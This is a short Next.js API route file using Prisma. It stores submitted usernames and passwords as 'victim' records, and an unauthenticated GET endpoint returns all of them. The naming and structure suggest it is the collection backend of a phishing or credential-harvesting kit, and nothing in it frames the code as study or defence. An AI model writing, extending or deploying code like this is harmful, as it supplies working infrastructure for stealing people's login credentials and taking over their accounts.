import { NextRequest } from "next/server";
import { PrismaClient } from "../generated/prisma";

const prisma = new PrismaClient();

export async function GET() {
  const Victims = await prisma.victim.findMany({});

  return Response.json({ Victims });
}

export async function POST(req: NextRequest) {
  const { username, password } = await req.json();

  if (!username || !password) {
    return Response.json({
      response: false,
      message: "Failed to Send Data...",
    });
  }

  await prisma.victim.create({
    data: {
      username,
      password,
    },
  });

  return Response.json({ response: true, message: "Data Sended Successfully" });
}
